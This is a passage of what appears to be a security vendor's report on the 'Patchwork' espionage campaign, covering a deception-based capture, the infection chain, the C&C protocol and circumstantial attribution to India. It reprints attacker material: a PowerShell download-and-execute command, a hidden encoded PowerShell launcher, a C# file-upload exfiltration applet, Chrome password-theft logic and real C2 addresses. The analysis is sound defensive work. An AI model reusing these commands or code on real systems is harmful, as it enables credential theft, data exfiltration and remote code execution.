There are indications of activity as early as 2014, but Cymmetria has\nnot observed any such activity first hand.\n\nPatchwork targets were chosen worldwide with a focus on personnel working on military and\npolitical assignments, and specifically those working on issues relating to Southeast Asia and the\nSouth China Sea. Many of the targets were governments and government-related organizations.\n\nWhat makes this report special is that Patchwork is the first targeted threat captured using a\ncommercial deception product. Through the use of deception campaigns created with\nCymmetria’s MazeRunner, we were able to catch the threat actor’s second stage toolset, as well\nas lateral movement activity.\n\n\nThe code used by this threat actor is copypasted from various online forums, in a way\nthat reminds us of a patchwork quilt – hence\nthe name we’ve given the operation.\n\nIn active victim systems, Patchwork\nimmediately searches for and uploads\ndocuments to their C&C, and only if the\ntarget is deemed valuable enough, proceeds\nto install a more advanced second stage\nmalware.\n\nIt is impossible to reach clear attribution\nfrom the information available. We have\nincluded an attribution section in this\ndocument to document our research efforts\nin this regard.\n\n\n**Attacker operating times that overlap with a**\n\n**standard 9am-7pm workday (darker means**\n\n**larger volume)**\n\n\n**The deception campaign (see “The investigation” section)**\n\n\n-----\n\n### ACKNOWLEDGEMENTS\n\nWe would like to acknowledge our colleagues Brandon Levene at Palo Alto Networks, Kaspersky\nLab’s GReAT team, and others whom we can’t mention, for their assistance and cooperation.\n\n\n-----\n\n## THE INVESTIGATION\n\n### OVERVIEW\n\nThe attack was detected as part of a spear phishing against a government organization in Europe\nin late May 2016. The target was an employee working on Chinese policy research and the attack\nvector was a PowerPoint presentation file. The content of the presentation was on issues relating\nto Chinese activity in the South China Sea.\n\n**Screenshot of the first slide from one of the infected presentations**\n\nAfter the presentation is opened, the vulnerability highlighted by CVE-2014-4114 is exploited.\nThis is a well documented vulnerability commonly called Sandworm, which only works on\nunpatched versions of Microsoft Office PowerPoint 2003 and 2007.\n\nOnce the exploit worked, it deployed the first stage payload: a compiled AutoIt script. This script\nthen bypassed UAC using a known method called UACME, the code for which was taken from an\nonline forum.\n\n**Screenshot of the AutoIt malware publication forum post[1 ]**\n\n\n_________________\n\n\n¹ http://www.indetectables.net/viewtopic.php?f=7&t=52263&sid=b6fe274a4e8934fceb0f3fc90cd35aa2\n\n\n-----\n\nWith higher privileges, the first stage payload ran PowerSploit to download code to run a reverse\nshell with Meterpreter – the RAT of the well known MetaSploit framework.\n\nThe next stage was exfiltration of document files that are also used to validate the value of the\ninfection. If the infected system was deemed valuable enough, the threat actor then infected the\ntarget host with a second stage payload, which was once again a module built from code taken\nfrom various online forums and resources.\n\n**Flowchart of infection stages**\n\nSince the threat had already been detected and stopped, our goal was to discover as much as we\ncould about the threat actor. Specifically, we were interested in tools, techniques, and\nprocedures (TTPs), so that we would be able to detect the threat in case it succeeded in gaining a\nfoothold elsewhere in customers’ assets. Learning about the threat actor’s TTPs would also allow\nus to prevent the threat actor from launching another operation targeted at our customer, as\nwell as prevent them from launching similar attacks against other customers in the future.\n\n**Our investigation proceeded on two fronts:**\n\n1. We built a deception campaign to discover the second stage malware and the actor’s TTPs,\n\nwhile the operation was still active.\n\n2. We investigated the operation to uncover the threat actor’s capabilities.\n\n### HUNTING THE ATTACKER WITH A DECEPTION CAMPAIGN\n\nIn order to capture the attacker’s second stage malware (persistence) and observe their pivoting\nbehavior in the network (lateral movement), we created a realistic environment in which to hunt\nthe threat actor. We did so by using Cymmetria's MazeRunner solution to deploy a deception\ncampaign. A deception campaign is essentially a story comprised of breadcrumbs and decoys; it\nleads attackers to believe that they have successfully gained access to a target machine.\n\n_Breadcrumbs are pieces of data that lead an attacker to another machine; these could be stored_\ncredentials, open shares, browser cookies, VPN configurations, and more. Decoys are full\noperating systems running on virtual machines that act as real and high-value targets for an\nattacker; breadcrumbs point to decoys, which are fully monitored for any attacker interaction.\n\n\n-----\n\n[The campaign (which can be found on Cymmetria Research’s GitHub) was built to fit the specific](https://github.com/CymmetriaResearch/CymmetriaResearch)\nprofile of the active target. MazeRunner captured all the forensic data associated with the threat,\nso we knew that the threat actor followed the breadcrumbs and activated all the stages of their\nattack. MazeRunner allowed us to see all of the network traffic, operating system changes, and\nlateral movement the threat actor performed.\n\nThis is the first time, to our knowledge, that an APT (or more aptly, a targeted attack) has been\ndeceived and captured by a deception solution that caused the threat actor to follow\nbreadcrumbs and attack decoys, ultimately leading to the disclosure of the operation.\n\n**The deception campaign that caught the APT**\n\n### GETTING STARTED\n\nAs mentioned in the previous section, our first order of business was verifying that the operation\nwas still active, and then creating a deception campaign around it to catch the second stage\nmalware and discover and mitigate other TTPs being used by the threat actor. To this end, we\ncreated a target in the form of a profile for a person in whom the threat actor was interested. We\nthen constructed a deception campaign based on that profile. In this case, the person was a\nmember of a government think tank dealing with security issues.\n\n**A network around the infected endpoint was created using MazeRunner:**\n\n- SMB shares were created on decoys, and mapped on the target laptop, to play the part of\n\nnetwork backups.\n\n- Further, RDP credentials were deployed on the laptop to lead to a service running on a decoy\n\nsystem in the cloud.\n\n**SMB breadcrumb leading to the file server decoy**\n\n\n-----\n\n**RDP Breadcrumb that leads to a cloud decoy**\n\n### CHAIN OF EVENTS\n\n1. The PowerPoint PPS file was opened, which in turn dropped the initial payload components.\n\nThe exploit used was CVE-2014-4114 (Sandworm).\n\n**Driver.inf content**\n\n1.\n\n2. The endpoint was infected with the following executables:\n\n     - `sysvolinfo.exe – AutoIt compiled script.`\n\n     - PowerShell reverse shell HTTPS Meterpreter script – Was pulled from the C2 server\nand was executed using the following requests:\n\n        - `212[.]129.13.110/dropper.php?profile=<base64 of`\n```\n       [username@computername]>\n\n```\n        - `hxxps://45[.]43.192.172:8443/OxGN`\n\n3. Files from the target laptop were being uploaded by the threat actor to the control server,\n\nalongside significant activity on the encryption channel. We did not monitor the SSL encrypted\nchannel, in order to avoid detection in case Meterpreter’s “sstagerverifysslcert”\noption was used.\n\n4. The threat actor decided to drop the second stage malware, 7zip.exe, onto the infected\n\nendpoint. The tool scanned the hard disk, and talked with 212[.]83.191.156.\n\n5. It copied itself as netvmon.exe into C:\\Windows\\SysWOW64\\netvmon.exe and added\n\nthat path to the startup programs. This is how the threat actor achieves persistence.\n\n\n-----\n\n6. Three days following the initial infection, alerts were received on the decoy running the SMB\n\nshared folder indicating access by the threat actor.\n\n7. The malware accessed the mapped share that was deployed as a breadcrumb on the infected\n\nlaptop while scanning all the drives for files. The actual function that caused the alert was\nGetDriveTypeA (which is called to assure that only fixed drives are traversed).\n\n8. After the first alerts in the system were generated, we saw connection attempts to our cloud\n\ndecoy via RDP. This decoy’s IP address was placed as an RDP credentials breadcrumb on the\ntarget laptop. The alerts originated from 212[.]129.7.146, and the entire event lasted for\n12 minutes.\n\n9. The alerts we received in MazeRunner indicated that the attackers failed to log in several\n\ntimes, which makes us believe that they pulled the RDP connection file (breadcrumb) that was\non the infected desktop. It is interesting to note that they didn’t mine the credentials using\nmimikatz (which would have enabled them to connect to the cloud decoy with ease).\n\n10. We believe this connection was carried out by the same threat actor because:\n\n  - The IP they used to connect to our decoy also belongs to rev.poneytelecom.eu.\n\n  - The event took place on the same day we received the alerts on our internal system.\n\nThis shows that the threat actor was deceived into exfiltrating data, deploying their second\nstage persistence tool, and using the breadcrumbs that we left on the infected laptop.\nFurthermore, if they had used mimikatz, they also would have succeeded in connecting to our\ncloud decoy and be encouraged to deploy other, later stage tools.\n\n**Network layout**\n\n\n-----\n\n### INTELLIGENCE GAINED FROM THE ACTOR’S C&C SERVER\n\nThrough one of our partners, we managed to receive access to one of the threat actor’s\ncommand and control servers. The server contained a multitude of additional files:\n\n  - An abundance of PPS files – the spear phishing infecting files\n\n  - Additional malicious code packages\n\nMost of the spear phishing files’ content[2] was directly related to China-related subjects, or\npornographic in nature. Some examples of the spear phishing PPS attachment files used by the\nthreat actor:\n\nFrom the C&C server, we also extracted the dates on which the PPS lures were last modified;\nthese dates ranged from December 2015 to January 2016. The dates were grouped together and\nthen plotted. The resulting graph is a good indication of times at which we believe the attackers\nprepared and carried out their attack.\n\n**Number of PPS edits by date**\n\n\n_____________\n\n\n2 We have no direct proof of this, but information from several partners suggests that stolen documents\nare being actively repurposed for spear phishing purposes.\n\n\n-----\n\n## TECHNICAL ANALYSIS\n\n### TOOLS DEPLOYED\n\n**ATTACK VECTOR**\n\n**Flowchart of infection stages**\n\nThe attack vector is a spear phishing email with a PPS file attachment. It utilizes the exploit of\nCVE-2014-4114 (Sandworm). The exploit code closely resembles a public proof of concept exploit\nfound on exploit-db1³. The exploit enables the attacker to drop files and execute an INF file,\nwhich is a Windows driver descriptor file.\n\n**Through the exploit, the attack drops two files that are embedded in an OLE object to the local**\n**machine:**\n\n - Driver.inf\n\n - Sysvolinfo.exe\n\n**Driver.inf content**\n\nAfter dropping the files, the exploit executes the INF file by calling the Windows utility\n```\nInfDefaultInstall.exe with the dropped driver.inf as a parameter.\n\n```\nThis causes the execution of the Windows utility RunOnce.exe, which receives the\n```\nsysvolinfo.exe file as a parameter and executes it.\n\n```\n\n**ATTACK VECTOR**\n\n\n_____________\n\n\n³ https://www.exploit-db.com/exploits/35019/\n\n\n-----\n\n**DROPPER**\n\nThe sysvolinfo.exe is the first stage payload of the threat actor (another name seen is\n```\nuplv1032.exe). Its purpose is to escalate privileges, exfiltrate data, and download and execute\n\n```\nan online remote access tool based on PowerSploit⁴. Through the now installed Meterpreter, the\nactor can issue commands to run on the infected machine manually.\n\n**Originally created by an unknown user of “O RLY Cover Generator”[5]**\n\nThe sysvolinfo.exe code itself is a compiled AutoIt script. A significant portion of its code is\ncopied from the online hacking forum “Indetectables[”6. ]\n\nC&C COMMUNICATIONS\n\nOnce the tool starts, its first action is to connect back to the C&C server and send a beacon,\nlistening for commands. Below is the analysis of the C&C protocol.\n\n**Definitions:**\n```\n      ComputerID = BASE64ENCODE(“$USERNAME@$COMPUTERNAME”)\n      ddager = Is startup registry key added (Bool)\n      r1 = BASE64ENCODE(result of OSVersion macro, e.g. WIN_7)\n      r2 = BASE64ENCODE(result of OSArch macro, e.g. X64)\n      r3 = BASE64ENCODE(trojan version, 1.1 in our sample)\n      r4 = BASE64ENCODE(Does the SQLite database folder (\n      @UserProfileDir &  “\\AppData\\Local\\Google\\Chrome\\User\n      Data\\Default\\”) exist (1) or not (0))\n      r5 = BASE64ENCODE(stdout of last cmd command)\n      r6 = BASE64ENCODE(1 if running as administrator, 0 if not)\n\n```\n**On beacon function call a POST request to:**\n\n- hxxp://212[.]129.13.110/dropper.php?profile= + $ComputerID\n\n\n_____________\n\n\n⁴ PowerSploit: the PowerShell version of Meterpreter, a popular remote access tool from the MetaSploit\nframework.\n⁵ https://dev.to/rly\n\n6 http://www.indetectables.net/viewtopic.php?f=7&t=52263&sid=b6fe274a4e8934fceb0f3fc90cd35aa2\n\n\n-----\n\n**Which is sent with the following parameters:**\n```\n  - ddager, r1, r2, r3, r4, r5, r6.\n\n```\n**The return value of the request is structured as follows:**\n\n   - “$sdata|$payload”, where sdata is the command to run (by id, 1-8), and payload\nis the argument for the command.\n\n**The available commands are:**\n\n**Command ID** **Command explanation**\n\n“1” The debug print describes the command as \"[+] ServFlag :\n`Disabled\",` but the actual code is doing nothing.\n\n“2” If command “2” wasn’t called before, then execute a PowerShell script with\nthe UAC bypass vulnerability: \"powershell -nop -wind hidden -noni\n```\n        -enc \" & $PAYLOAD\n\n```\n“3” Reset the inner state of the script to ignore previous execution of command\n“2”, thus allowing command “2” to execute again.\n\n“4” Exit the script.\n\n“5” Executes _emorhc function with base64decode($payload) as arg (see\nbelow).\n\n“6” Executes _getnewver function with base64decode($payload) as arg\n(see below).\n\n“7” Executes _instcust function with base64decode($payload) as arg\n(see below).\n\n“8” Executes the cmd command stored in base64 in $payload and saves its\noutput to r5.\n\n**Functions:**\n\n`_emorhc($dllurl)` – Searches for sqlite3.dll (or sqlite3_x64.dll in 64 bit). If not\nfound, it downloads it from $dllurl. The function then proceeds to close all the “chrome.exe”\nprocesses, dump the login data database @USERPROFILEDIR &\n```\n\"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\"\n\n```\ninto C:\\recoveryx\\Protected.ie2, upload the file, and delete it. Note: the authors forgot to\ndelete the c:\\recoveryx directory.\n\n`_getnewver($newverurl)` – Deletes itself, downloads a new version from $newverurl, and\nexecutes it. Cmd command:\n\n```\n“cmd.exe /c ping -n 5 127.0.0.1 > nul & del \" & @SCRIPTFULLPATH & \" & ping -n\n5 127.0.0.1 > nul & powershell IEX (New-Object\nSystem.Net.WebClient).DownloadFile('\" & $newverurl & \"', '\" & @SCRIPTFULLPATH\n& \"') & \" & @SCRIPTFULLPATH”. \n\n```\n\nThey are using ping between commands for an unknown reason. A possible usage is as a sleep(5).\n\n\n-----\n\n`_instcust($custurl)` – Downloads a “custom” executable and executes it with the UAC\nbypass vulnerability.\n\n`_upload($f_path, $f_name, $repeat, $retry)` – Handles all file upload.

The post contains the following data:\n\n```\n```\n\"Content-Disposition: form-data; name=\"\"filename\"\"; filename=\"\"\" &\n$f_name & \"|\" & $f_hash & \"\"\"\" & @CRLF & @CRLF & $ffile & @CRLF \n\n```\n\nWhere $f_hash is the md5 cheksum of the file to be uploaded, $f_name is the base64\nencoding of $f_name, and $ffile is the content of the file.\n\nAfter sending beacon to the server, it continues to scan the “Program Files” directories (both x86\nand the standard path) for a directory with the string “Total Security”⁶ (the installation path of the\n“360 Total Security”[7] antivirus), and, oddly, proceeds to do nothing with that knowledge.\n\nThe payload will install itself in the startup programs folder as \"Baidu Software Update\"\n(HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run). It then\nsends another beacon to the server, after which it starts to recursively go over all of the fixed\ndrives in the computer and look for files with the following extensions:\n\n  - doc\n\n  - pdf\n\n  - csv\n\n  - ppt\n\n  - docx\n\n  - pst\n\n  - xls\n\n  - xlsx\n\n  - pptx\n\n**It then uploads all of the files to the server at:**\n```\n  212[.]129.13.110/update-request.php?profile=\n\n```\nThe decompiled applet which drives this functionality has a very interesting PDB included\n```\n“C:\\Users\\Kanishk\\Documents\\Visual Studio\n2015\\Projects\\ConsoleApplication1\\ConsoleApplication1\\obj\\Debug\\ConsoleA\npplication1.pdb”.\n\n```\n\n____________\n\n\n7 https://www.360totalsecurity.com/\n\n\n-----\n\n**Applet code included below:**\n```\nnamespace ConsoleApplication1\n{\n  internal class Program\n  {\n    private static void Main(string[] args)\n    {\n      try\n      {\n        string fileName = args[0];\n        WebClient webClient = new WebClient();\n        webClient.UploadFile(args[1], \"POST\", fileName);\n      }\n      catch\n      {\n      }\n    }\n  }\n}\n\n```\nPRIVILEGE ESCALATION\n\nAfter the previous stages, the payload uses a well known and as-of-yet unpatched UAC bypass\nvulnerability in Microsoft Windows (known as UACME[8]), which works on the default setup of\nWindows 7[9]. This allows the attackers to execute commands as Administrator.\n\nIf the AutoIt script is compiled for x86 systems (/x86 flag), the payload hides the UAC bypass\nvulnerability exploitation inside svchost.exe using a technique called Process Hollowing[10] (UAC\nbypass method – ‘IFileOperation COM Object’[11]). If the AutoIt script is compiled for x64 systems\n(/x64 flag), the oobe[12] UAC bypass method is used.\n\n\n___________\n\n\n8 https://github.com/hfiref0x/UACME\n\n9 According to research, also Windows 8 as claimed by Peter Kleissner,\nhttps://download.pureftpd.org/misc/UAC.cpp\n\n10 https://www.trustwave.com/Resources/SpiderLabs-Blog/Analyzing-Malware-Hollow-Processes\n\n11 https://www.greyhathacker.net/?p=796\n\n12 http://www.labofapenetrationtester.com/2015/09/bypassing-uac-with-powershell.html\n\n\n-----\n\nSHELLCODE EXECUTION\n\nWhen the AutoIt malware’s heartbeat receives a “2” in $sdata (this seems to be the most\ncommon scenario), the included, base64-encoded response data is decoded and executed using\nthe command “powershell -nop -wind hidden -noni -enc”. We observed that the\nbase64 encoded payload was a PowerShell script that closely resembled code designed to allow\nx86 shellcode to run on x64 architectures[13]. This PowerShell script executed an additional\npayload, which was a PowerSploit script[14] used to invoke shellcode containing a reverse HTTPS\nMeterpreter.\n\nREVERSE HTTPS METERPRETER\n\nThe AutoIt script escalates privileges and then executes a PowerShell script that is easily\nfingerprinted as a reverse HTTPS Meterpreter. It seems likely that the PowerShell scripts were\ncopied from an online blog[15], and the Meterpreter payload inside was generated using the\nparameters:\n\n - LHOST=45[.]43.192.172\n\n - LPORT=8443\n\n**The process tree of the initial exploit and later payloads**\n\n**SECOND STAGE PAYLOAD**\n\nThis tool is only downloaded and installed after the attacker first uses the Meterpreter and\ndetermines that the target is valuable. We refer to the payload as 7zip.exe, but it can also be\nnamed ndcrypt.exe and nd.exe.\n\n\n___________\n\n\n\n[13] https://www.trustedsec.com/may-2013/native-powershell-x86-shellcode-injection-on-64-bit-platforms/\n\n[14] https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1\n\n[15] http://0entropy.blogspot.com/2012/04/powershell-metasploit-meterpreter-and.html\n\n\n-----\n\n**Hex view of the 7zip.exe memory dump**\n\nMost of this payload’s code is based on a public online code project in GitHub[16].\n\n**Once unpacked, the module performs these actions:**\n\n- In order to persist past computer shutdown and power on, the payload copies itself to a\n\nsystem directory, renames the file to netmon.exe, and adds the executable to the startup\nprograms as “Net Monitor”:\n```\n   C:\\Windows\\SysWOW64\\netmon.exe - example of the final destination on 64-bit\n\n```\nsystem running 7zip.exe/netmon.exe via WOW64\n\n- One thread scans all drive letters and exfiltrates files with certain extensions in the permanent\n\ndrives (not searching network drives or USB).\n\nNote: this is called the GetDriveTypeA function in kernel32.dll, which caused the alert\non our system.\n\n- Another thread is uploading files of the same formats as from the Dropper payload (see above)\n\nto hxxp://212[.]83.191.156/http/up.php.\n\n- Another thread downloads an executable from\n```\n hxxp://212[.]83.191.156/http/down.php and executes it. We didn’t observe this\n\n```\nbehavior.\n\n\n___________\n\n\n16 https://github.com/yorickdewid/MyDoom\n\n\n-----\n\n## ATTRIBUTION\n\nWhile we cannot make definitive claims of attribution, we will present evidence that may assist in\nlater efforts to identify this threat actor.\n\n### PREVIOUSLY EXAMINED INFORMATION\n\nLet’s examine the attribution information we have discussed thus far in this report.\n\nMany of the primary targets of this campaign are regional neighbors of India, and other targets\nseem to be targeted (by their interests, occupation, and by the content of the spear phishing) to\nissues affecting India. Circumstantially, this targeting correlates with intelligence requirements\nnecessary for a pro-Indian entity.\n\nHowever, we felt this was not enough to draw direct conclusions. What we believe makes this\ncorrelation much stronger and hints that this is a pro-Indian or Indian entity, is the addition of\ntime of day activity analysis as detailed below.\n\n### PPS EDIT TIME ANALYSIS[17]\n\nFollowing a review of the PPS files found on the C&C server, we extracted data concerning the\ntime of day when each PPS file was last modified, and plotted this on a graph. Below, we can see\nthat more editing occurred during certain hours of the day.\n\n**Number of edits by time of day**\n\n\n___________\n\n\n17 Time zone analysis and research activity associated with daytime hours is circumstantial by definition.\nSome threat actors work around the clock, and manipulation of timestamps has been seen in past attacks\nby various threat actors. While it should be treated with due suspicion, it has also proven itself highly\nvaluable in analysis of APT threat actors in the past and cannot be discounted.\n\n\n-----\n\nBased on modification times of the infecting presentation files, we see two distinct batches of\nwork. The first, where the bulk of changes has been made, stretches from around 4:00 to 12:00\nin coordinated universal time. To visualize what exactly that means, this time range was\nconsidered in the context of a standard 9am - 7pm work day and applied to a map. The “First\nstretch of work” label on the map below depicts the areas of the world in which 4:00 - 12:00 UTC\nwould fall within the standard work day. Similarly, the time zones shaded within the “Second\nstretch of work” area are representative of the areas of the world in which 19:00 - 22:00 UTC falls\nwithin the work day. Since the time span of the second stretch of work is smaller in range, the\nhours in universal time fall within the working hours of more countries. Based on this map, we\ncan conclude that it is most likely that the threat actors were based within the blue areas.\n\n**Attacker operating times that overlap with a standard 9am-7pm workday (darker means larger**\n\n**volume)**\n\nMany of the conclusions drawn from the above map were also confirmed through other sources.\nExtra data we were able to extract and analyze further correlated with this data, as well as with\nthe previous PPS data.\n\n\n-----\n\n### C&C ACTIVITY TIMES\n\nThe time at which servers were staged was listed not only by hour, but by day of the week. After\nplotting these times by hour, with the day of the week specified through color coordination, we\ncan see various patterns. It was more common for servers to be staged on certain days of the\nweek, such as Sunday, rather than on other days, such as Saturday. These times are also\nclustered together in a clump for the most part, with almost no activity earlier than 2:00 UTC,\nand besides one exception on Sunday, not later than 11:00 UTC. This clump is very similar to the\nrange of time specified within the first clump of time in the PPS editing graph and the “First\nstretch of work” area of the “Threat actor working hours” diagram.\n\n**Displays the number of times a server was staged by hour of day, color-coordinated by day of**\n\n**the week**\n\nOther data extracted from the server included the time of day and day of the week of domain\nregistrations. After plotting these on a graph, we observed that domains were registered only on\nspecific days of the week. The other important feature is that all of these incidents occurred\nbetween 3:00 and 15:00 UTC, which is a slightly wider range than the first stretch of time in the\nPPS editing graph, but still very comparable.\n\n\n-----\n\n**Displays the number of domain registrations by hour of day, color-coordinated by day of the**\n\n**week**\n\nExtra analysis we were able to conduct was on the compilation times, by time of day and day of\nthe week. After plotting these on a graph, we observed that, similar to domain registrations,\ncompilations only occurred on specific days of the week. All the events took place between 2:00\nand 10:00 UTC, which is only a slight shift of the time span in the first stretch of PPS editing.\n\n\n-----\n\n**Displays the number of compilations by hour of day, color-coordinated by day of the week**\n\nAll three of these graphs provide confirmation that these attacks were clustered partially by day\nof the week but mostly by time of day. Specifically, the time of day when staging servers, domain\nregistration, and compilations occurred most frequently lined up with the first stretch of time\nseen in the PPS[18] editing data. This applies to the area of the map within the “First stretch of\ntime” label and adds weight to our conclusion that the threat actors live in the blue area.\n\nThis time of day activity data, when combined with the previous circumstantial evidence (the\nthreat actor’s intelligence requirements, the countries targeted around India, the other targets\naround the world, and the content of the spear phishing, directs us to the conclusion that this\nthreat actor correlates with a location in India.\n\nCarefully, we feel obligated to note that further evidence suggests potential links between this\nthreat actor and the operations known as Hangover/Appin, but this possible link is still being\nresearched and is far from conclusive.\n\nThat said, attribution is tricky business and it’s never possible to be entirely conclusive.\n\n\n___________\n\n\n18 Information from several partners suggests that the documents being stolen and then\nrepurposed for spear phishing purposes also contain language indicators that support our\nhypothesis, but we have no direct information to support this.\n\n\n-----\n\n## CONCLUSIONS\n\nPatchwork is a highly successful targeted attack operation, infecting approximately 2,500 highvalue targets worldwide. It is surprising that it has remained undetected since its operations\nbegan in December, as it seems to have been built out of a confluence of code taken from\nvarious public and hidden criminal forums, as well as various open source projects.\n\nWhat makes this disclosure special is the use of Cymmetria’s cyber deception platform[19] to catch\nthe threat actor, capturing their second stage toolset and lateral movement activity. Without\ndeception, capturing second-stage tools and activity has previously been difficult (to say the\nleast).\n\nThe high degree of operational capacity stands in stark contradiction to the low technical ability\ndisplayed, which raises the question of whether the copy-paste nature of the threat was\npotentially intentional, perhaps an evolution of threat actors attempting to avoid the high cost of\nlosing their expensive tool box and malware when they are eventually publically disclosed. This,\nhowever, seems unlikely, as the use of such second-hand code is consistent with their second\nstage toolset meant for persistence, which should typically be built to resist detection.\n\nWhile one can almost never be conclusive in attribution, based on the information we have it is\nplausible that the threat actor is a pro-Indian one. As our CEO Gadi Evron said in an internal\ndiscussion, “There is a possibility that another threat actor wanted to look like India and built a\nfalse flag operation to fit, but there is zero evidence to support that claim, and it feels like we’re\nreaching just to attack our own argument.”\n\nUnlike other APT threat actors, India seems to be a relatively quiet locale for cyber espionage\nactivity, if indeed this is a pro-Indian threat actor, it is noteworthy by itself. The scope and scale\nof this operation are quite surprising considering the low technical capability displayed, which we\nbelieve is a growing trend seen among disparate threat actors.\n\n\n___________\n\n19 Cymmetria’s MazeRunner\n\n\n-----\n\n## APPENDIX 1 – IOCS\n\nAll IoCs (in CSV and STIX formats), and the MazeRunner campaign file, can be found on\n[Cymmetria research’s
